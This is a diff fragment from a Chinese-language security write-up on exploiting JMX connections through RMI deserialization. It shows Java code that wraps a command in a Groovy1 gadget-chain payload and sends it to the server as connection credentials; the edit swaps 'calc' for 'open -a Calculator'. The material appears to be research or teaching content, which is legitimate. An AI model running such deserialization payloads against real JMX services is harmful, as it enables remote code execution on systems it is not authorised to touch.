@@ -98,7 +98,7 @@ javax.naming.InitialContext.lookup(InitialContext.java:417)
 当客户端使用`JMXConnectorFactory.connect`去连接服务端时，最终调用到`javax.management.remote.rmi.RMIServerImpl_Stub#newClinet`发起连接。其实该方法符合我们在攻击RMI Registry中提到的“应用层反序列化问题”情况：new Client方法参数为Object类型，可以塞入我们的恶意Payload(利用JMXConnector.CREDENTIALS配置添加)，  
 ```java  
 public static void main(String[] args) throws Exception {  
-    Object obj = new Groovy1().getObject(&#34;calc&#34;);  
+    Object obj = new Groovy1().getObject(&#34;open -a Calculator&#34;);  
     connectWithJmxUrlByObject(obj);  
 }  
   
